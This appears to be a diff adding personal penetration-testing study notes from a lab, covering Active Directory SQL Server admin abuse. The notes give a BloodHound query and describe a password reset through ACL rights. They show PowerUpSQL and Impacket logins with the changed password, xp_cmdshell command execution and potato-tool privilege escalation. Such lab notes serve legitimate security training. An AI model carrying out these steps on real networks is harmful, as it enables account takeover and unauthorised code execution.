@@ -75,3 +75,51 @@ evil-winrm -i 10.129.201.234 -u forend
 
 ---
 ## SQL Server Admin
+BloodHound, once again, is a great bet for finding this type of access via the `SQLAdmin` edge. We can check for `SQL Admin Rights` in the `Node Info` tab for a given user or use this custom Cypher query to search:
+```cypher
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+```
+
+Here we see one user, `damundsen` has `SQLAdmin` rights over the host `ACADEMY-EA-DB01`.
+#### Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound
+![[Pasted image 20251110103800.png]]
+We can use our ACL rights to authenticate with the `wley` user, change the password for the `damundsen` user and then authenticate with the target using a tool such as `PowerUpSQL`, which has a handy [command cheat sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet). Let's assume we changed the account password to `SQL1234!` using our ACL rights. We can now authenticate and run operating system commands.
+
+First, let's hunt for SQL server instances.
+#### Enumerating MSSQL Instances with PowerUpSQL
+```powershell
+PS C:\htb> cd .\PowerUpSQL\
+PS C:\htb>  Import-Module .\PowerUpSQL.ps1
+PS C:\htb>  Get-SQLInstanceDomain
+
+ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
+Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
+DomainAccountSid : 1500000521000170152142291832437223174127203170152400
+DomainAccount    : damundsen
+DomainAccountCn  : Dana Amundsen
+Service          : MSSQLSvc
+Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
+LastLogon        : 4/6/2022 11:59 AM
+```
+
+We could then authenticate against the remote SQL server host and run custom queries or operating system commands. It is worth experimenting with this tool, but extensive enumeration and attack tactics against MSSQL are outside this module's scope.
+```powershell
+PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
+
+VERBOSE: 172.16.5.150,1433 : Connection Success.
+
+Column1
+-------
+Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
+```
+
+We can also authenticate from our Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.
+#### Running mssqlclient.py Against the Target
+```shell
+mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
+```
+Finally, we can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal.
+
+
+
+
